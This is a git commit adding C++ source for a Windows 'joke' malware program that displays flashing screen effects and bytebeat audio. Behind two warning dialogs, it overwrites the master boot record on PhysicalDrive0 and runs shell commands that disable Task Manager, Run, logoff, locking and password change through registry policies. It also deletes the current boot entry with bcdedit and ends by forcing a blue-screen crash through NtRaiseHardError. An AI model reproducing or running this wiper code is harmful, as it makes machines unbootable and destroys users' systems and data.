ee939264d2a2e7c6f68fb046a1c96d5e8157ab43
NindowsCahel132 <131256087+Shape1R4@users.noreply.github.com>
2025-06-21 10:21:17 +0700

    Add files via upload

---
+++ bysiid7syus/bysiid7syus/bysiid7syus.cpp
@@ -0,0 +1,705 @@
+﻿//bysiid7syus.cpp in release x86
+
+#include <windows.h>
+#include <tchar.h>
+#include <iostream>
+#include <windowsx.h>
+#pragma comment(lib, "winmm.lib")
+#pragma comment(lib,"Msimg32.lib")
+#include <math.h>
+#include <time.h>
+#include "bootrec.h"
+#define M_PI   3.14159265358979323846264338327950288
+typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+typedef struct
+{
+	FLOAT h;
+	FLOAT s;
+	FLOAT l;
+} HSL;
+
+namespace Colors
+{
+	//These HSL functions was made by Wipet, credits to him!
+	//OBS: I used it in 3 payloads
+
+	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
+	//So I didn't used in this malware.
+
+	HSL rgb2hsl(RGBQUAD rgb)
+	{
+		HSL hsl;
+
+		BYTE r = rgb.rgbRed;
+		BYTE g = rgb.rgbGreen;
+		BYTE b = rgb.rgbBlue;
+
+		FLOAT _r = (FLOAT)r / 255.f;
+		FLOAT _g = (FLOAT)g / 255.f;
+		FLOAT _b = (FLOAT)b / 255.f;
+
+		FLOAT rgbMin = min(min(_r, _g), _b);
+		FLOAT rgbMax = max(max(_r, _g), _b);
+
+		FLOAT fDelta = rgbMax - rgbMin;
+		FLOAT deltaR;
+		FLOAT deltaG;
+		FLOAT deltaB;
+
+		FLOAT h = 0.f;
+		FLOAT s = 0.f;
+		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
+
+		if (fDelta != 0.f)
+		{
+			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
+			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
+			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
+			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
+
+			if (_r == rgbMax)      h = deltaB - deltaG;
+			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
+			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
+			if (h < 0.f)           h += 1.f;
+			if (h > 1.f)           h -= 1.f;
+		}
+
+		hsl.h = h;
+		hsl.s = s;
+		hsl.l = l;
+		return hsl;
+	}
+
+	RGBQUAD hsl2rgb(HSL hsl)
+	{
+		RGBQUAD rgb;
+
+		FLOAT r = hsl.l;
+		FLOAT g = hsl.l;
+		FLOAT b = hsl.l;
+
+		FLOAT h = hsl.h;
+		FLOAT sl = hsl.s;
+		FLOAT l = hsl.l;
+		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
+
+		FLOAT m;
+		FLOAT sv;
+		FLOAT fract;
+		FLOAT vsf;
+		FLOAT mid1;
+		FLOAT mid2;
+
+		INT sextant;
+
+		if (v > 0.f)
+		{
+			m = l + l - v;
+			sv = (v - m) / v;
+			h *= 6.f;
+			sextant = (INT)h;
+			fract = h - sextant;
+			vsf = v * sv * fract;
+			mid1 = m + vsf;
+			mid2 = v - vsf;
+
+			switch (sextant)
+			{
+			case 0:
+				r = v;
+				g = mid1;
+				b = m;
+				break;
+			case 1:
+				r = mid2;
+				g = v;
+				b = m;
+				break;
+			case 2:
+				r = m;
+				g = v;
+				b = mid1;
+				break;
+			case 3:
+				r = m;
+				g = mid2;
+				b = v;
+				break;
+			case 4:
+				r = mid1;
+				g = m;
+				b = v;
+				break;
+			case 5:
+				r = v;
+				g = m;
+				b = mid2;
+				break;
+			}
+		}
+
+		rgb.rgbRed = (BYTE)(r * 255.f);
+		rgb.rgbGreen = (BYTE)(g * 255.f);
+		rgb.rgbBlue = (BYTE)(b * 255.f);
+
+		return rgb;
+	}
+}
+int red, green, blue;
+bool ifcolorblue = false, ifblue = false;
+COLORREF Hue(int length) { //Credits to Void_/GetMBR
+	if (red != length) {
+		red < length; red++;
+		if (ifblue == true) {
+			return RGB(red, 0, length);
+		}
+		else {
+			return RGB(red, 0, 0);
+		}
+	}
+	else {
+		if (green != length) {
+			green < length; green++;
+			return RGB(length, green, 0);
+		}
+		else {
+			if (blue != length) {
+				blue < length; blue++;
+				return RGB(0, length, blue);
+			}
+			else {
+				red = 0; green = 0; blue = 0;
+				ifblue = true;
+			}
+		}
+	}
+}
+DWORD WINAPI MBRWiper(LPVOID lpParam) {
+	DWORD dwBytesWritten;
+	HANDLE hDevice = CreateFileW(
+		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
+		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
+		OPEN_EXISTING, 0, 0);
+
+	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
+	return 1;
+}
+DWORD WINAPI Disabler(LPVOID lpParam) {
+	system("taskkill /f /im taskmgr.exe");
+	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
+	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
+	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
+	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
+	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
+	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
+	system("bcdedit /delete {current}");
+	return 1;
+}
+DWORD WINAPI notaskbar(LPVOID lpvd)
+{
+	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
+	ShowWindow(hShellWnd, SW_HIDE);
+	return 666;
+}
+DWORD WINAPI shader1(LPVOID lpvd) //Credits WinMalware And Malsteve527 To VenraTech
+{
+	HDC hdc = GetDC(NULL);
+	HDC hdcCopy = CreateCompatibleDC(hdc);
+	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+	BITMAPINFO bmpi = { 0 };
+	HBITMAP bmp;
+
+	bmpi.bmiHeader.biSize = sizeof(bmpi);
+	bmpi.bmiHeader.biWidth = screenWidth;
+	bmpi.bmiHeader.biHeight = screenHeight;
+	bmpi.bmiHeader.biPlanes = 1;
+	bmpi.bmiHeader.biBitCount = 32;
+	bmpi.bmiHeader.biCompression = BI_RGB;
+
+
+	RGBQUAD* rgbquad = NULL;
+	HSL hslcolor;
+
+	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
+	SelectObject(hdcCopy, bmp);
+
+	INT i = 0;
+
+	float colorShift = 310.0;
+	float colorIntensity = 0.40;
+
+	while (true)
+	{
+		hdc = GetDC(NULL);
+		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
+
+		RGBQUAD rgbquadCopy;
+
+		for (int x = 0; x < screenWidth; x++)
+		{
+			for (int y = 0; y < screenHeight; y++)
+			{
+				int index = y * screenWidth + x;
+
+				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x & y ^ x > i));
+
+				rgbquadCopy = rgbquad[index];
+
+				hslcolor = Colors::rgb2hsl(rgbquadCopy);
+
+				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 2.0f);
+				hslcolor.s = 3;
+				hslcolor.l = fmod(hslcolor.l + (y % 25) / 100.0f, 2.0f);
+
+				rgbquad[index] = Colors::hsl2rgb(hslcolor);
+			}
+		}
+
+		i++;
+
+		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
+		ReleaseDC(NULL, hdc);
+		DeleteDC(hdc);
+	}
+
+	return 0x00;
+}
+DWORD WINAPI bounce(LPVOID lpParam) // VenraTech To Modified It
+{
+	HDC hdc;
+	int sw, sh;
+	double angle = 0.0;
+	int xadd, yadd;
+	while (1) {
+		hdc = GetDC(NULL);
+		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+		xadd = cos(angle) * 15, yadd = tan(angle) * 15;
+		HBRUSH brush = CreateSolidBrush(RGB(rand() % 239, rand() % 239, rand() % 239));
+		SelectObject(hdc, brush);
+		BitBlt(hdc, xadd, yadd, sw, sh, hdc, 0, 0, 0xffff);
+		angle += M_PI / 10;
+		ReleaseDC(NULL, hdc);
+		Sleep(10);
+	}
+}
+DWORD WINAPI shader2(LPVOID lpvd)
+{
+	HDC hdc = GetDC(NULL);
+	HDC hdcCopy = CreateCompatibleDC(hdc);
+	int w = GetSystemMetrics(0);
+	int h = GetSystemMetrics(1);
+	BITMAPINFO bmpi = { 0 };
+	HBITMAP bmp;
+
+	bmpi.bmiHeader.biSize = sizeof(bmpi);
+	bmpi.bmiHeader.biWidth = w;
+	bmpi.bmiHeader.biHeight = h;
+	bmpi.bmiHeader.biPlanes = 1;
+	bmpi.bmiHeader.biBitCount = 32;
+	bmpi.bmiHeader.biCompression = BI_RGB;
+
+	RGBQUAD* rgbquad = NULL;
+	HSL hslcolor;
+
+	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
+	SelectObject(hdcCopy, bmp);
+
+	INT i = 0;
+
+	while (1)
+	{
+		hdc = GetDC(NULL);
+		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
+
+		RGBQUAD rgbquadCopy;
+
+		for (int x = 0; x < w; x++)
+		{
+			for (int y = 0; y < h; y++)
+			{
+				int index = y * w + x;
+
+				int fx = (int)((i * 4) + (i * 4) * sin(x / 24.0));
+
+				rgbquadCopy = rgbquad[index];
+
+				hslcolor = Colors::rgb2hsl(rgbquadCopy);
+				hslcolor.h = fmod(fx / 300.f + y / h * .10f, 1.f);
+
+				rgbquad[index] = Colors::hsl2rgb(hslcolor);
+			}
+		}
+
+		i++;
+		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
+		ReleaseDC(NULL, hdc); DeleteDC(hdc);
+	}
+
+	return 0x00;
+}
+DWORD WINAPI polygon1(LPVOID lpParam) {
+	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	int signX = 1;
+	int signY = 1;
+	int signX1 = 1;
+	int signY1 = 1;
+	int incrementor = 10;
+	int x = 10;
+	int y = 10;
+	while (1) {
+		HDC hdc = GetDC(0);
+		int top_x = 0 + x;
+		int top_y = 0 + y;
+		int bottom_x = 100 + x;
+		int bottom_y = 100 + y;
+		x += incrementor * signX;
+		y += incrementor * signY;
+		HBRUSH brush = CreateSolidBrush(Hue(239));
+		SelectObject(hdc, brush);
+		if (x != 0 && y != 0) Pie(hdc, top_x, top_y, bottom_x, bottom_y, rand() % x, rand() % y, rand() % x, rand() % y);
+		HPEN hPen = CreatePen(PS_SOLID, 2, Hue(239));
+		HPEN hOldPen = SelectPen(hdc, hPen);
+
+		HBRUSH hBrush = CreateSolidBrush(Hue(239));
+		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);
+
+		POINT vertices[] = { {x + 300, y + 100}, {x + 200, y + 200}, {x + 100, y + 200} };
+		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
+
+		SelectBrush(hdc, hOldBrush);
+		DeleteObject(hBrush);
+
+		SelectPen(hdc, hOldPen);
+		DeleteObject(hPen);
+		if (y >= GetSystemMetrics(SM_CYSCREEN))
+		{
+			signY = -1;
+		}
+
+		if (x >= GetSystemMetrics(SM_CXSCREEN))
+		{
+			signX = -1;
+		}
+
+		if (y == 0)
+		{
+			signY = 1;
+		}
+
+		if (x == 0)
+		{
+			signX = 1;
+		}
+		Sleep(1);
+		DeleteObject(brush);
+		ReleaseDC(0, hdc);
+	}
+}
+DWORD WINAPI shader3(LPVOID lpvd)
+{
+	HDC hdc = GetDC(NULL);
+	HDC hdcCopy = CreateCompatibleDC(hdc);
+	int w = GetSystemMetrics(0);
+	int h = GetSystemMetrics(1);
+	BITMAPINFO bmpi = { 0 };
+	HBITMAP bmp;
+
+	bmpi.bmiHeader.biSize = sizeof(bmpi);
+	bmpi.bmiHeader.biWidth = w;
+	bmpi.bmiHeader.biHeight = h;
+	bmpi.bmiHeader.biPlanes = 1;
+	bmpi.bmiHeader.biBitCount = 32;
+	bmpi.bmiHeader.biCompression = BI_RGB;
+
+	RGBQUAD* rgbquad = NULL;
+	HSL hslcolor;
+
+	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
+	SelectObject(hdcCopy, bmp);
+
+	INT i = 0;
+
+	while (1)
+	{
+		hdc = GetDC(NULL);
+		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
+
+		RGBQUAD rgbquadCopy;
+
+		for (int x = 0; x < w; x++)
+		{
+			for (int y = 0; y < h; y++)
+			{
+				int index = y * w + x;
+
+				FLOAT fx = 255 * i;
+
+				rgbquadCopy = rgbquad[index];
+
+				hslcolor = Colors::rgb2hsl(rgbquadCopy);
+				hslcolor.h = fmod(fx / 300.f + y / h * .10f, 1.f);
+
+				rgbquad[index] = Colors::hsl2rgb(hslcolor);
+			}
+		}
+
+		i++;
+		StretchBlt(hdc, 1, 1, w - 2, h - 2, hdcCopy, 0, 0, w, h, SRCCOPY);
+		ReleaseDC(NULL, hdc); DeleteDC(hdc);
+	}
+
+	return 0x00;
+}
+DWORD WINAPI shader4(LPVOID lpvd) //credits to fr4ctalz for the base
+{
+	HDC hdc = GetDC(NULL);
+	HDC hdcCopy = CreateCompatibleDC(hdc);
+	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+	BITMAPINFO bmpi = { 0 };
+	HBITMAP bmp;
+
+	bmpi.bmiHeader.biSize = sizeof(bmpi);
+	bmpi.bmiHeader.biWidth = screenWidth;
+	bmpi.bmiHeader.biHeight = screenHeight;
+	bmpi.bmiHeader.biPlanes = 1;
+	bmpi.bmiHeader.biBitCount = 32;
+	bmpi.bmiHeader.biCompression = BI_RGB;
+
+
+	RGBQUAD* rgbquad = NULL;
+	HSL hslcolor;
+
+	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
+	SelectObject(hdcCopy, bmp);
+
+	INT i = 0;
+
+	while (1)
+	{
+		hdc = GetDC(NULL);
+		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
+
+		RGBQUAD rgbquadCopy;
+
+		for (int x = 0; x < screenWidth; x++)
+		{
+			for (int y = 0; y < screenHeight; y++)
+			{
+				int index = y * screenWidth + x;
+
+				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x + y | i & x));
+
+				rgbquadCopy = rgbquad[index];
+
+				hslcolor = Colors::rgb2hsl(rgbquadCopy);
+				hslcolor.h = fmod(fx / 300.f + y / screenHeight * .10f, 1.f);
+
+				rgbquad[index] = Colors::hsl2rgb(hslcolor);
+			}
+		}
+
+		i++;
+
+		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
+		ReleaseDC(NULL, hdc);
+		DeleteDC(hdc);
+	}
+
+	return 0x00;
+}
+DWORD WINAPI textout(LPVOID lpvd) //credits to N17Pro3426 for the resized text
+{
+	int x = GetSystemMetrics(0);
+	int y = GetSystemMetrics(1);
+	LPCSTR text = 0;
+	LPCSTR text1 = 0;
+	while (1)
+	{
+		HDC hdc = GetDC(0);
+		SetBkMode(hdc, 0);
+		text = "bysiid7syus.exe";
+		text1 = "Destroy This PC";
+		SetTextColor(hdc, Hue(239));
+		HFONT font = CreateFontA(rand() % 32, rand() % 26, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
+		SelectObject(hdc, font);
+		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
+		Sleep(10);
+		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
+		Sleep(10);
+		DeleteObject(font);
+		ReleaseDC(0, hdc);
+	}
+}
+DWORD WINAPI tanwaves1(LPVOID lpParam) {
+	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
+	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+	double angle = 0;
+	for (;;) {
+		hdc = GetDC(0);
+		for (float i = 0; i < sw + sh; i += 0.99f) {
+			int a = tan(angle) * 50;
+			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
+			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, NOTSRCCOPY);
+			angle += M_PI / 50;
+			DeleteObject(&a); DeleteObject(&i);
+		}
+		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
+		ReleaseDC(wnd, hdc);
+		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
+	}
+}
+VOID WINAPI sound1() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t >> 8 | t >> 1) & (+t >> 8));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound2() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(463 * t * (t >> 8 | t >> 2) & t);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound3() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t >> 3 | t | t >> 9) * 10 - 4 * (t & t >> 1));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound4() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t >> 7 | t >> 9) & t);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound5() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		if (t != 0) buffer[t] = static_cast<char>(t & (t >> 7 | t >> 7));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound6() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		if (t != 0) buffer[t] = static_cast<char>((2 * t & 25734) * (t >> 6 & 255) >> 9);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+int CALLBACK WinMain(
+	HINSTANCE hInstance, HINSTANCE hPrevInstance,
+	LPSTR     lpCmdLine, int       nCmdShow
+)
+{
+	if (MessageBoxW(NULL, L"A Malware Run?", L"bysiid7syus.exe by NindowsCahel132", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+	{
+		ExitProcess(0);
+	}
+	else
+	{
+		if (MessageBoxW(NULL, L"Are you sure? Release x86, Overwrite Mbr - NOT for epilepsy", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - bysiid7syus.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+		{
+			ExitProcess(0);
+		}
+		else
+		{
+			CreateThread(0, 0, MBRWiper, 0, 0, 0);
+			CreateThread(0, 0, Disabler, 0, 0, 0);
+			Sleep(5000);
+			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
+			sound1();
+			Sleep(30000);
+			TerminateThread(thread1, 0);
+			CloseHandle(thread1);;
+			InvalidateRect(0, 0, 0);
+			HANDLE thread2 = CreateThread(0, 0, bounce, 0, 0, 0);
+			sound2();
+			Sleep(30000);
+			TerminateThread(thread2, 0);
+			CloseHandle(thread2);
+			InvalidateRect(0, 0, 0);
+			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
+			HANDLE thread3dot1 = CreateThread(0, 0, polygon1, 0, 0, 0);
+			sound3();
+			Sleep(30000);
+			TerminateThread(thread3, 0);
+			CloseHandle(thread3);
+			InvalidateRect(0, 0, 0);
+			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
+			sound4();
+			Sleep(30000);
+			TerminateThread(thread4, 0);
+			CloseHandle(thread4);
+			InvalidateRect(0, 0, 0);
+			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
+			HANDLE thread5dot1 = CreateThread(0, 0, textout, 0, 0, 0);
+			sound5();
+			Sleep(30000);
+			TerminateThread(thread5, 0);
+			CloseHandle(thread5);
+			InvalidateRect(0, 0, 0);
+			HANDLE thread6 = CreateThread(0, 0, tanwaves1, 0, 0, 0);
+			sound6();
+			Sleep(30000);
+			TerminateThread(thread6, 0);
+			CloseHandle(thread6);
+			InvalidateRect(0, 0, 0);
+			BOOLEAN bl;
+			DWORD response;
+			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
+			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
+			RtlAdjustPrivilege(19, 1, 0, &bl);
+			NtRaiseHardError(0xC000FFFF, 0, 0, 0, 6, &response);
+			Sleep(-1);
+		}
+	}
+}
